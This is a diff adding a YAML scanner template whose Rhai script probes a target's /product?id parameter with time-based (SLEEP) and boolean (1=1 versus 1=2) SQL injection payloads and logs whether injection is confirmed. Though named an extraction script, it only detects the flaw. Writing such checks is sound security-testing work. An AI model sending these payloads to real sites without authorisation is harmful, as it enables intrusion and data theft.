@@ -1,0 +1,34 @@
+id: script-blind-sqli-extraction
+info:
+  name: "Blind SQL Injection Data Extraction Script"
+  severity: "Critical"
+  description: "Advanced Rhai script that performs blind SQL injection using time-based and boolean techniques."
+scripts:
+  - engine: "rhai"
+    source:
+      code: |
+        let base = target_url;
+        log("Starting blind SQL injection extraction on " + base);
+
+        // Time-based blind test
+        let start = timestamp();
+        let resp = http_get(base + "/product?id=1' AND SLEEP(3)--");
+        let elapsed = timestamp() - start;
+        log("Time-based test: " + elapsed + "ms");
+
+        if elapsed > 2000 {
+          log("VULNERABLE: Time-based SQL injection confirmed!");
+          return true;
+        }
+
+        // Boolean-based blind test
+        let resp_true = http_get(base + "/product?id=1' AND 1=1--");
+        let resp_false = http_get(base + "/product?id=1' AND 1=2--");
+        log("True response len: " + resp_true.body.len + " False response len: " + resp_false.body.len);
+
+        if resp_true.body.len != resp_false.body.len {
+          log("VULNERABLE: Boolean-based SQL injection confirmed!");
+          return true;
+        }
+
+        false
